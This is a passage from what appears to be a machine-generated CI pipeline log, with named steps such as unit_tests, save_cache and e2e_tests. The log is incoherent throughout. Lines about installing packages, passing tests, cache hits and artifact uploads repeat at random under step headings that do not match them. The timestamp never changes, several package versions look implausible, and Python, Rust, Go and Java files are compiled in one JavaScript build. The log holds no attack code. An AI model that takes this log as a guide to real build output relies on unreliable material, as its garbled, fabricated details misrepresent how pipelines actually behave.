src/index.js...\n  PASS: test_user_create (396ms)\nInstalling prettier@2.3.0\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (18ms)\nStep 9/10: Building\nCompiling src/main.py...\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (5MB)\n=== Step setup_environment completed ===\n=== Step: type_check ===\n  PASS: test_db_connect (63ms)\n\u2713 build completed\n\u2713 lint completed\nCache hit for key-9579\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_auth_login (439ms)\nStep 9/10: Building\n\u2713 lint completed\n  PASS: test_api_health (141ms)\nInstalling prettier@1.13.0\nInstalling axios@4.11.0\nCache hit for key-4231\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\nInstalling axios@1.8.0\nCache hit for key-4919\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (294ms)\n\u2713 lint completed\n\u2713 lint completed\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-9839\nStep 10/10: Building\nCache hit for key-9103\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\nInstalling axios@3.6.0\n  PASS: test_db_connect (92ms)\nInstalling eslint@1.16.0\n  PASS: test_db_connect (282ms)\n  PASS: test_api_health (450ms)\nWARNING: eslint has known vulnerabilities\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (3MB)\nInstalling webpack@5.11.0\nInstalling webpack@1.12.0\nCompiling src/main.py...\nInstalling prettier@5.14.0\n  PASS: test_user_create (310ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nInstalling eslint@4.11.0\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-9824\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-1883\nCompiling src/utils.go...\nCache hit for key-2268\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_user_create (295ms)\n\u2713 build completed\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-5016\n\u2713 build completed\nInstalling prettier@3.15.0\nWARNING: prettier has known vulnerabilities\nCompiling src/main.py...\nStep 6/10: Building\nInstalling webpack@5.14.0\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 test completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\nStep 2/10: Building\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (13MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling express@1.15.0\nCache hit for key-8411\nException: TypeError\nArtifact uploaded: build.tar.gz (21MB)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (203ms)\nWARNING: jest has known vulnerabilities\n[12:00:35] INFO: Processing request\nCache hit for key-2399\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u2713 test completed\n  PASS: test_user_create (111ms)\nCache hit for key-2391\nInstalling express@1.18.0\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 test completed\nCompiling src/service.java...\nCache hit for key-2104\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (267ms)\n[12:00:35] INFO: Processing request\nWARNING: eslint has known vulnerabilities\nInstalling prettier@3.12.0\nException: ValueError\n  PASS: test_user_create (93ms)\nStep 3/10: Building\n[12:00:35] INFO: Processing request\n  PASS: test_db_connect (427ms)\nFAILED: test_cache_hit\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nInstalling react@4.9.0\n\u2713 test completed\nWARNING: axios has known vulnerabilities\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_user_create (481ms)\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-3636\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:35] INFO: Processing request\nInstalling jest@3.0.0\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:35] WARN: Deprecated API usage\nInstalling webpack@3.9.0\nStep 10/10: Building\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\nCompiling src/app.ts...\nWARNING: react has known vulnerabilities\n  PASS: test_auth_login (384ms)\n=== Step type_check completed ===\n=== Step: unit_tests ===\n\u2713 build completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nException: TypeError\nArtifact uploaded: build.tar.gz (5MB)\nStep 4/10: Building\nStep 10/10: Building\n  PASS: test_auth_login (203ms)\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (199ms)\nCompiling src/service.java...\nCache hit for key-7004\n[12:00:35] INFO: Processing request\nStep 8/10: Building\n\u2713 test completed\nStep 6/10: Building\n  PASS: test_api_health (190ms)\n\u2713 lint completed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 test completed\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nCache hit for key-9685\n\u2713 build completed\nStep 8/10: Building\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (43MB)\nStep 2/10: Building\n[12:00:35] INFO: Processing request\nInstalling axios@2.15.0\nArtifact uploaded: build.tar.gz (22MB)\nStep 1/10: Building\n[12:00:35] INFO: Processing request\nInstalling express@4.20.0\nCompiling src/index.js...\nCache hit for key-3970\nCompiling src/index.js...\n[12:00:35] WARN: Deprecated API usage\nInstalling jest@5.1.0\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/main.py...\nCompiling src/handler.rs...\nCache hit for key-4447\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_api_health (114ms)\nCompiling src/index.js...\nInstalling webpack@2.18.0\n[12:00:35] INFO: Processing request\nCache hit for key-4573\n[12:00:35] ERROR: Connection failed\nCache hit for key-3347\n  PASS: test_cache_hit (23ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nCache hit for key-8917\nInstalling webpack@3.17.0\nCache hit for key-6840\nStep 8/10: Building\n[12:00:35] INFO: Processing request\nCache hit for key-9364\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling eslint@2.18.0\n  PASS: test_db_connect (335ms)\nInstalling eslint@4.11.0\nCompiling src/handler.rs...\nCache hit for key-9852\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_api_health (424ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (370ms)\nStep 8/10: Building\nInstalling lodash@5.10.0\nCache hit for key-5720\n\u2713 lint completed\nCache hit for key-1071\nCache hit for key-7068\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_api_health (371ms)\n\u2713 build completed\nStep 2/10: Building\n\u2717 build failed with exit code 97\nException: ValueError\n  PASS: test_api_health (105ms)\nInstalling jest@1.18.0\nWARNING: lodash has known vulnerabilities\n[12:00:35] INFO: Processing request\nStep 8/10: Building\nException: NullPointerException\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-1421\nStep 9/10: Building\nWARNING: express has known vulnerabilities\nCache hit for key-4826\nCompiling src/index.js...\n\u2713 lint completed\n\u2713 test completed\nInstalling jest@5.10.0\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\nCompiling src/main.py...\nCache hit for key-3188\nStep 9/10: Building\nWARNING: eslint has known vulnerabilities\nStep 2/10: Building\n\u2713 build completed\nCompiling src/service.java...\nInstalling webpack@5.2.0\nCache hit for key-1327\nArtifact uploaded: build.tar.gz (31MB)\n  PASS: test_auth_login (36ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\n  PASS: test_db_connect (232ms)\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_db_connect (441ms)\nInstalling react@4.15.0\nCache hit for key-5727\nStep 6/10: Building\nInstalling prettier@1.17.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:35] INFO: Processing request\n=== Step unit_tests completed ===\n=== Step: save_cache ===\n  PASS: test_user_create (452ms)\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (136ms)\nCompiling src/index.js...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (12MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-3781\nArtifact uploaded: build.tar.gz (10MB)\nStep 1/10: Building\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 lint completed\n\u2713 build completed\nStep 4/10: Building\n\u2713 build completed\n  PASS: test_db_connect (171ms)\nCache hit for key-9000\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: ValueError\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 test completed\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 1/10: Building\nInstalling lodash@5.11.0\n[12:00:35] ERROR: Connection failed\n  PASS: test_cache_hit (266ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (27MB)\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 test completed\n  PASS: test_cache_hit (394ms)\nCompiling src/main.py...\n\u2713 test completed\n  PASS: test_cache_hit (275ms)\nCompiling src/handler.rs...\nCache hit for key-3212\nCache hit for key-5564\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_db_connect (413ms)\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (312ms)\nStep 8/10: Building\nCache hit for key-7191\n\u2713 test completed\nCompiling src/main.py...\nCache hit for key-7639\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_user_create (300ms)\nCache hit for key-9763\n\u2713 lint completed\n  PASS: test_api_health (474ms)\n[12:00:35] INFO: Processing request\nCache hit for key-7135\n  PASS: test_user_create (377ms)\nCache hit for key-2326\nFAILED: test_cache_hit\n  PASS: test_db_connect (320ms)\nStep 10/10: Building\nStep 4/10: Building\n\u2713 build completed\nInstalling lodash@3.11.0\nCache hit for key-4727\n\u2713 test completed\nStep 4/10: Building\nInstalling eslint@1.9.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-8026\n[12:00:35] INFO: Processing request\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:35] INFO: Processing request\n\u2713 test completed\nInstalling express@4.2.0\n  PASS: test_auth_login (496ms)\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 build completed\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\n\u2713 test completed\nCache hit for key-6749\nCompiling src/service.java...\n\u2713 lint completed\nStep 9/10: Building\nStep 3/10: Building\n[12:00:35] INFO: Processing request\nInstalling jest@2.6.0\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nStep 4/10: Building\n  PASS: test_user_create (440ms)\nCache hit for key-4657\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-2369\n  PASS: test_auth_login (194ms)\nCache hit for key-9848\nInstalling express@4.3.0\nInstalling react@2.3.0\n  PASS: test_user_create (461ms)\nInstalling webpack@1.9.0\nInstalling webpack@5.4.0\nCompiling src/utils.go...\nCache hit for key-5349\nArtifact uploaded: build.tar.gz (16MB)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-1947\n[12:00:35] ERROR: Connection failed\n  PASS: test_api_health (164ms)\nStep 3/10: Building\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (130ms)\n[12:00:35] INFO: Processing request\nInstalling express@5.1.0\nStep 2/10: Building\n[12:00:35] ERROR: Connection failed\n[12:00:35] ERROR: Connection failed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (20MB)\nInstalling lodash@1.10.0\n\u2713 build completed\n\u2713 test completed\nInstalling jest@2.18.0\nArtifact uploaded: build.tar.gz (24MB)\n=== Step save_cache completed ===\n=== Step: e2e_tests ===\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_api_health (65ms)\n[12:00:35] INFO: Processing request\n\u2713 build completed\n[12:00:35] INFO: Processing request\n\u2713 lint completed\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_api_health (464ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_api_health (293ms)\n\u2713 test completed\nCache hit for key-8028\n[12:00:35] INFO: Processing request\nStep 8/10: Building\nCache hit for key-8899\n[12:00:35] INFO: Processing request\nCache hit for key-4851\nStep 7/10: Building\nCompiling src/utils.go...\nStep 7/10: Building\nCompiling src/utils.go...\nCache hit for key-2924\nInstalling jest@2.20.0\n[12:00:35] INFO: Processing request\nCache hit for key-7939\nCache hit for key-8444\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\nInstalling react@3.3.0\nArtifact uploaded: build.tar.gz (8MB)\nArtifact uploaded: build.tar.gz (44MB)\nStep 9/10: Building\nStep 9/10: Building\nInstalling lodash@2.12.0\n\u2713 lint completed\nCompiling src/main.py...\n\u2713 test completed\n  PASS: test_api_health (423ms)\n\u2713 build completed\nStep 9/10: Building\n[12:00:35] INFO: Processing request\nStep 2/10: Building\n[12:00:35] INFO: Processing request\nCache hit for key-2244\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_auth_login (176ms)\nCache hit for key-4653\nInstalling lodash@1.7.0\n  PASS: test_auth_login (203ms)\nInstalling webpack@4.7.0\nCompiling src/app.ts...\nStep 2/10: Building\nCache hit for key-5408\n  PASS: test_auth_login (388ms)\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_auth_login (482ms)\nCompiling src/index.js...\n  PASS: test_user_create (54ms)\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nCompiling src/app.ts...\nInstalling eslint@4.13.0\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/index.js...\nInstalling prettier@1.20.0\nCompiling src/utils.go...\nCache hit for key-1385\n\u2713 lint completed\nStep 5/10: Building\nStep 5/10: Building\nStep 6/10: Building\n\u2713 build completed\nCache hit for key-6687\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCache hit for key-2777\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (4MB)\nStep 7/10: Building\n[12:00:35] ERROR: Connection failed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (26MB)\nInstalling lodash@2.8.0\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-9807\n\u2713 build completed\n[12:00:35] WARN: Deprecated API usage\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 lint completed\n\u2713 lint completed\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_cache_hit (403ms)\nInstalling react@4.8.0\n  PASS: test_auth_login (49ms)\nCache hit for key-1839\n\u2713 lint completed\nWARNING: react has known vulnerabilities\nStep 8/10: Building\nCache hit for key-1694\nStep 5/10: Building\n\u2713 lint completed\nCache hit for key-5770\nStep 10/10: Building\nStep 3/10: Building\n\u2713 lint completed\nWARNING: webpack has known vulnerabilities\nStep 4/10: Building\nInstalling axios@2.16.0\nInstalling lodash@4.9.0\n\u2713 build completed\n[12:00:35] INFO: Processing request\n\u2713 build completed\nInstalling axios@5.14.0\n\u2713 test completed\n  PASS: test_user_create (299ms)\n[12:00:35] ERROR: Connection failed\n\u2713 test completed\nCache hit for key-1971\nCompiling src/handler.rs...\nCache hit for key-7384\n  PASS: test_user_create (451ms)\n[12:00:35] INFO: Processing request\nStep 10/10: Building\nWARNING: axios has known vulnerabilities\nStep 2/10: Building\nCache hit for key-5229\nCache hit for key-8236\n  PASS: test_db_connect (288ms)\nInstalling eslint@1.13.0\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (3MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-9839\n[12:00:35] INFO: Processing request\nStep 4/10: Building\nInstalling webpack@3.13.0\n  PASS: test_api_health (49ms)\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nCompiling src/index.js...\n\u2713 lint completed\nInstalling jest@2.7.0\nCompiling src/main.py...\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_db_connect (319ms)\nCache hit for key-1507\n  PASS: test_cache_hit (380ms)\n  PASS: test_user_create (75ms)\n[12:00:35] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nCompiling src/handler.rs...\nInstalling axios@5.7.0\nStep 5/10: Building\nCache hit for key-4174\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n\u2713 lint completed\nCompiling src/handler.rs...\nStep 9/10: Building\nStep 9/10: Building\nStep 8/10: Building\n\u2717 build failed with exit code 61\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/index.js...\n  PASS: test_api_health (380ms)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-4152\nCompiling src/utils.go...\nStep 7/10: Building\nCompiling src/handler.rs...\nCompiling src/service.java...\nInstalling jest@5.16.0\nInstalling react@1.20.0\nCache hit for key-3760\nCompiling src/utils.go...\nCache hit for key-7915\n\u2713 build completed\nInstalling express@1.15.0\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_user_create (359ms)\n\u2713 lint completed\nStep 9/10: Building\n  PASS: test_db_connect (489ms)\nInstalling axios@4.6.0\n[12:00:35] INFO: Processing request\nStep 10/10: Building\nCache hit for key-8525\nStep 5/10: Building\nStep 3/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (2MB)\nStep 6/10: Building\n\u2713 lint completed\nCache hit for key-3805\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling axios@3.7.0\nCompiling src/app.ts...\n  PASS: test_db_connect (155ms)\n\u2713 build completed\n[12:00:35] WARN: Deprecated API usage\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_user_create (210ms)\n\u2713 lint completed\n  PASS: test_user_create (176ms)\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (31MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 6/10: Building\nInstalling express@4.19.0\nInstalling lodash@5.17.0\nArtifact uploaded: build.tar.gz (9MB)\nStep 2/10: Building\n[12:00:35] INFO: Processing request\nCache hit for key-2486\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nFAILED: test_auth_login\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\nStep 5/10: Building\nInstalling jest@3.18.0\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_cache_hit (431ms)\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:35] WARN: Deprecated API usage\nInstalling webpack@1.2.0\nStep 5/10: Building\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_auth_login (117ms)\nInstalling express@4.4.0\n  PASS: test_auth_login (337ms)\nWARNING: eslint has known vulnerabilities\nCache hit for key-3827\n[12:00:35] INFO: Processing request\nStep 8/10: Building\nCache hit for key-8645\n  PASS: test_api_health (278ms)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 test completed\nCache hit for key-4175\nCompiling src/main.py...\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:35] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (17MB)\n=== Step upload_artifacts completed ===\n=== Step: restore_cache ===\nInstalling eslint@4.3.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nInstalling lodash@3.9.0\n[12:00:35] WARN: Deprecated API usage\n\u2713 test completed\n  PASS: test_db_connect (255ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:35] INFO: Processing request\nInstalling webpack@1.7.0\n\u2713 lint completed\nStep 3/10: Building\nCache hit for key-6796\nInstalling jest@3.10.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (40MB)\nInstalling lodash@3.13.0\nStep 4/10: Building\n\u2713 lint completed\n  PASS: test_auth_login (136ms)\nStep 5/10: Building\nWARNING: eslint has known vulnerabilities\n\u2713 test completed\nException: RuntimeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-3836\nCompiling src/handler.rs...\n  PASS: test_cache_hit (463ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 build completed\nStep 2/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (43MB)\nInstalling axios@3.3.0\n  PASS: test_user_create (199ms)\n\u2713 test completed\n  PASS: test_db_connect (426ms)\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (220ms)\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-7062\nStep 2/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_api_health (295ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\nCache hit for key-6047\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:35] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 lint completed\n  PASS: test_db_connect (61ms)\nStep 6/10: Building\n\u2713 build completed\nStep 7/10: Building\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (21MB)\nInstalling prettier@2.1.0\nStep 10/10: Building\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nCompiling src/app.ts...\n\u2713 build completed\n\u2713 test completed\nFAILED: test_cache_hit\n\u2713 lint completed\n  PASS: test_db_connect (262ms)\nInstalling prettier@2.6.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (42MB)\n\u2717 build failed with exit code 111\n  PASS: test_auth_login (133ms)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/app.ts...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\nInstalling prettier@4.5.0\n  PASS: test_user_create (425ms)\n\u2713 test completed\n[12:00:35] INFO: Processing request\nStep 5/10: Building\nInstalling eslint@4.11.0\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_auth_login (406ms)\nStep 7/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (44MB)\nInstalling prettier@1.10.0\n\u2713 build completed\nCompiling src/handler.rs...\nStep 2/10: Building\n\u2713 build completed\nCache hit for key-6823\n\u2713 build completed\n  PASS: test_db_connect (215ms)\nCompiling src/utils.go...\n\u2713 build completed\nCache hit for key-7047\n\u2713 lint completed\nCache hit for key-9596\nWARNING: webpack has known vulnerabilities\nInstalling react@2.20.0\nStep 7/10: Building\nStep 10/10: Building\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 build completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-4355\nInstalling jest@5.13.0\nInstalling react@1.9.0\nWARNING: express has known vulnerabilities\nFAILED: test_db_connect\n  PASS: test_user_create (205ms)\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_cache_hit (189ms)\nInstalling axios@1.6.0\nCompiling src/service.java...\n=== Step restore_cache completed ===\n=== Step: install_dependencies ===\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/main.py...\n  PASS: test_db_connect (271ms)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 lint completed\nStep 10/10: Building\nCache hit for key-1992\n  PASS: test_api_health (297ms)\nCache hit for key-9124\nInstalling axios@5.6.0\nArtifact uploaded: build.tar.gz (25MB)\nInstalling react@4.8.0\nInstalling webpack@4.5.0\nStep 3/10: Building\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\nCache hit for key-2826\nStep 9/10: Building\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 build completed\nInstalling webpack@1.14.0\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/utils.go...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:35] WARN: Deprecated API usage\nStep 7/10: Building\n[12:00:35] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/utils.go...\nStep 5/10: Building\n[12:00:35] INFO: Processing request\nInstalling eslint@2.8.0\n[12:00:35] INFO: Processing request\nStep 1/10: Building\nInstalling eslint@1.4.0\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-2267\nCompiling src/main.py...\nCompiling src/main.py...\nCache hit for key-1551\n  PASS: test_api_health (264ms)\nCompiling src/service.java...\n  PASS: test_auth_login (323ms)\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:35] ERROR: Connection failed\nCache hit for key-7088\nInstalling jest@3.5.0\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 test completed\nCompiling src/index.js...\n  PASS: test_user_create (113ms)\n\u2713 lint completed\nInstalling lodash@1.16.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (8MB)\nStep 7/10: Building\nStep 6/10: Building\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nCache hit for key-3973\n[12:00:35] INFO: Processing request\n\u2713 test completed\nInstalling lodash@5.14.0\nInstalling express@5.15.0\nInstalling webpack@2.8.0\nArtifact uploaded: build.tar.gz (6MB)\nInstalling jest@1.0.0\nCache hit for key-8565\nCompiling src/index.js...\nCompiling src/service.java...\nInstalling express@1.14.0\nCache hit for key-5481\n[12:00:35] INFO: Processing request\nCache hit for key-8144\nInstalling webpack@5.13.0\nCache hit for key-9040\nCache hit for key-4564\nStep 7/10: Building\nCache hit for key-7650\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\nStep 9/10: Building\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\n\u2713 test completed\n[12:00:35] WARN: Deprecated API usage\nStep 2/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (39MB)\nInstalling eslint@2.9.0\n  PASS: test_cache_hit (75ms)\n[12:00:35] INFO: Processing request\n\u2713 build completed\n\u2713 test completed\nStep 1/10: Building\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (257ms)\nCache hit for key-9591\nInstalling webpack@2.18.0\n\u2713 build completed\nCompiling src/service.java...\nCompiling src/utils.go...\nCache hit for key-2907\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_api_health (108ms)\nInstalling axios@3.18.0\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: 